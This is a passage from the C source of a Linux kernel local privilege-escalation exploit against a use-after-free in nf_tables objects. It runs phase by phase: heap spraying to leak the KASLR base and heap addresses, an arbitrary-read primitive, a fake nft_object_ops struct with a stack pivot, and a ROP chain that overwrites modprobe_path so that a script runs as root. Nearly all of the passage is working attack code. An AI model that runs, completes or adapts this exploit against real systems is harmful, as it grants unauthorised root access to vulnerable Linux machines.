	   If we succeed in making a seq_operations struct be allocated right where
	   our obj->key.name string was, we will be able to leak the single_open()
	   address by requesting the object name through the map.
	   
	   This though has another requirement, which is that obj is intact, so that
	   the pointer to the obj->key.name chunk is still existing.
	   
	*/
	
	so_leaked_addr = parse_uaf_obj_name_leak(TABLE_KLK_UAF_B, SET_KLK_UAF, 0x40 + 12, 0);
	if(so_leaked_addr == 0 || (so_leaked_addr & 0xffff000000000000) != 0xffff000000000000) {
		delete_table(TABLE_KLK_UAF_B);
		bye("[-] single_open() leak failed!");
	}
	
	puts("\t[*] Cleaning up descriptors...");
	
	/* Cleanup descriptors used in the seq_operations spraying */
	for(int i = 0 ; i < MAX_FDS ; i++)
		close(fds[i]);
	
	printf("\t[+] Leaked: single_open() @ 0x%lx\n", so_leaked_addr);
	
	kaslr_base = so_leaked_addr - SINGLE_OPEN_OFF;
	
	printf("\t[+] Leaked: KASLR base @ 0x%lx\n", kaslr_base);

	/* Once with KASLR base, recalculate offsets for every address we need */
	recalculate_from_kaslr_base();
	
	printf("\t[+] Leaked: prepare_kernel_cred() @ 0x%lx\n", prepare_kernel_cred);
	printf("\t[+] Leaked: commit_creds() @ 0x%lx\n", commit_creds);
	
	/* Cleanup (from phase 1) */
	
	puts("\t[*] Cleaning up...");
	delete_table(TABLE_KLK_UAF_B);
	
	/* ===================== [ Phase 2 - ctx->table leak ] ===================== */
	
	puts("[i] Phase 2 - ctx->table leak");
	
PHASE_2:

	/*
	   Our objective now is making nft_objects be allocated where our obj->key.name
	   string was, right as we did for the KASLR leak phase.
	   
	   To do so, we need to provide a string of 0xc8 - 1 bytes for the object name.
	   If we succeed, we will leak the first entry of one of the sprayed objects,
	   which is obj->list.next, and this one points to &ctx->table->objects
	*/

	puts("\t[*] Triggering UAF on nft_object struct...");
	hlk_obj_name = str_repeat('E', 0xc8 - 1);
	create_uaf(TABLE_HLK_UAF_A, TABLE_HLK_UAF_B, hlk_obj_name, SET_HLK_UAF, OBJECT_TYPE_LIMIT, 1, TABLE_OBJ_SPRAY_A, 0);
	delete_table(TABLE_HLK_UAF_A);
	
	puts("\t[*] Spraying with nft_object structs...");
	tbl_leaked_addr = spray_nft_object(TABLE_OBJ_SPRAY_A, 129, TABLE_HLK_UAF_B, SET_HLK_UAF);
	if(tbl_leaked_addr == 0 || (tbl_leaked_addr & 0xffff000000000000) != 0xffff000000000000) {
		delete_table(TABLE_HLK_UAF_B);
		delete_table(TABLE_OBJ_SPRAY_A);
		bye("[-] ctx->table leak failed!");
	}
		
	tbl_leaked_addr = tbl_leaked_addr - OFF_TO_OBJ_LST;
	
	printf("\t[+] Leaked: ctx->table (\"table3\") @ 0x%lx\n", tbl_leaked_addr);
	printf("\t[+] Leaked: &ctx->table->objects (\"table3\") @ 0x%lx\n", tbl_leaked_addr + OFF_TO_OBJ_LST);
	
	/* ===================== [ Phase 3 - ctx->table->objects.next leak ] ===================== */

	puts("[i] Phase 3 - ctx->table->objects.next leak");

	sleep(1.2);

PHASE_3:

	/*
	   At this point, we have a known address of an address where we can store contents by
	   spraying, which is exactly what we need for a fake nft_object_ops struct residing in
	   the kernel heap.
	   
	   To retrieve this address, we can prepare another UAF condition, and take over the
	   contents of the nft_object, use nla_memdup() spraying through table creation to
	   replace its contents and place in obj->key.name an arbitrary address, this way
	   we get a full arbitrary read primitive, that let us read bytes at any known
	   valid address. We are though a bit limited in that this pointer is treated as
	   a string pointer, and we will be able to read until a null terminator is found.
	   
	   Using this arbitrary read primitive, we will read the contents of &ctx->table->objects
	   which is ctx->table->objects.next, and the address contained there is the address of
	   one of the nft_objects we used to spray.
	*/

	sp_d = calloc(0xc8, sizeof(char));
	if(!sp_d)
		bye("[-] Error at calloc()");
	sp_d_l = (uint64_t *)sp_d;
	
	memset(sp_d, 'A', 0xc8);
	
	/* obj->key-name entry */
	sp_d_l[4] = (tbl_leaked_addr + OFF_TO_OBJ_LST) + 1; // "+ 1" because first byte will be null
	
	puts("\t[*] Triggering UAF on nft_object struct...");
	create_uaf(TABLE_RD_UAF_A, TABLE_RD_UAF_B, OBJ_RD_UAF, SET_RD_UAF, OBJECT_TYPE_COUNTER, 0, NULL, 0);
	delete_table(TABLE_RD_UAF_A);
	spray_memdup(sp_d, 0xc8, 2048);
	
	sleep(1);
	
	obj_leaked_addr = parse_uaf_obj_name_leak(TABLE_RD_UAF_B, SET_RD_UAF, 0x40 + 8, 1);
	if(obj_leaked_addr == 0 || (obj_leaked_addr & 0xffff000000000000) != 0xffff000000000000) {
		puts("[-] *ctx->table->objects leak failed!");
		goto FINAL_CLEANUP;
	}
	
	printf("\t[+] Leaked: ctx->table->objects.next @ 0x%lx\n", obj_leaked_addr);
	
	/* ===================== [ Phase 4 - Craft fake nft_object_ops struct ] ===================== */

	puts("[i] Phase 4 - Craft fake nft_object_ops struct");

PHASE_4:

	/*
	   We know the address of an object for which we can control its contents. We need now
	   to achieve this last by deleting the table where these objects reside, to then spray
	   with nla_memdup() allocations as a result of table creation. This way we can place
	   any contents we want in these objects, and we know for certain one of them will be
	   the one for which we know the address.
	   
	   As a result, we will predict that in a specific known heap address there will be
	   a fake nft_object_ops struct, which we will use in the next phase for obj->ops->eval
	   function pointer hijacking.
	*/
	
	puts("\t[*] Freeing sprayed nft_object structs...");
	delete_table(TABLE_OBJ_SPRAY_A);
	
	sp2_d = calloc(0xc8, sizeof(char));
	if(!sp2_d)
		bye("[-] Error at calloc()");
	sp2_d_l = (uint64_t *)sp2_d;
	
	for(int i = 0 ; i < (0xc8 / sizeof(uint64_t)) ; i++)
		sp_d_l[i] = stack_pivot_addr; // push rdi ; pop rsp ; add cl, cl ; ret
	
	puts("\t[*] Spraying with nla_memdup() allocations to craft fake nft_object_ops struct...");
	spray_memdup(sp_d, 0xc8, 4096);
	
	/* Cleanup (from phase 2, 3, 4) */
	puts("\t[*] Cleaning up...");
	delete_table(TABLE_RD_UAF_B);
	delete_table(TABLE_HLK_UAF_B);
	
	puts("\t[+] Fake nft_object_ops struct should be in target memory!");
	
	/* ===================== [ Phase 5 - Code execution ] ===================== */
	
	puts("[i] Phase 5 - Code execution (ROP)");
	
	sleep(2);
	
PHASE_5:
	/*
	   Finally, trigger UAF on the objects created at the very
	   beggining of the exploit.
	*/
	
	delete_table(TABLE_RP_UAF_A);
	
	rop_d = calloc(0xc8, sizeof(char));
	if(!rop_d)
		bye("[-] Error at calloc()");
	rop_d_l = (uint64_t *)rop_d;
	
	/*
	   We build a ROP chain in these sprayed nla_memdup()
	   allocations, with the hope that one of them end up
	   taking the chunk previously used by the nft_object
	   and for which we still keep a reference.
	   
	   The ROP chain will use a write-what-where gadget to
	   write our custom usermode helper for modprobe_path,
	   this will allow us to get a custom script of ours
	   be executed as root.
	   
	   Finally, we reach the KPTI trampoline for returning
	   to the userland.
	   
	*/

	rop_d_l[0] = pop_rdx_ret; 			// pop rdx ; ret
	rop_d_l[1] = modprobe_path;			// modprobe_path
	rop_d_l[2] = pop_rax_ret;			// pop rax ; ret
	rop_d_l[3] = 0x782f706d742f;			// "/tmp/x\x00\x00"
	rop_d_l[4] = mov_qptr_rdx_rax_ret;		// mov qword ptr [rdx], rax ; ret
	rop_d_l[5] = kpti_trampoline;			// swapgs_restore_regs_and_return_to_usermode + 22
	rop_d_l[6] = 0x0000000000000000;		// RAX
	rop_d_l[7] = 0x0000000000000000;		// RDI
	rop_d_l[8] = user_rip;				// user_rip
	rop_d_l[9] = user_cs;				// user_cs
	rop_d_l[10] = user_rflags;			// user_rflags
	rop_d_l[11] = user_sp;				// user_sp
	rop_d_l[12] = user_ss;				// user_ss
	rop_d_l[13] = 0x4343434343434343;		// dummy
	rop_d_l[14] = 0x4343434343434343;		// dummy
	rop_d_l[15] = 0x4343434343434343;		// dummy
	rop_d_l[16] = obj_leaked_addr;			// obj->ops (points to stack pivot: obj->ops->eval())s
	
	puts("\t[*] Spraying with nla_memdup() allocations containing ROP chain...");
	spray_memdup(rop_d, 0xc8, 4096);
	
	puts("\t[*] Triggering network hook...");
	
	/* Prevent problems with the creation of sockets to trigger the hooks */
	system("ip link set dev lo up");
	
	/* Set up server at TRIG_PORT in a new process */
	sfd = fork();
	if(sfd == 0) {
		setup_trig_server();
		exit(0);
	}
	
	/* Trigger the network hook we created for table TABLE_RP_UAF_B on the UAF-referenced object */
	cfd = fork();
	if(cfd == 0) {
		trig_net_sock();
		exit(0);
	}
	
	is_success = 1;
	r = write(pipefd[1], &is_success, sizeof(int));
	if(r < 0)
		return 1;
	
	sleep(10);
	
	/* ===================== [ Cleanup ] ===================== */

FINAL_CLEANUP:
	kill(cfd, SIGKILL);
	kill(sfd, SIGKILL);
	close(fd);
	delete_table(TABLE_RP_UAF_B);
	cleanup_spray_tables();
	return 0;

}





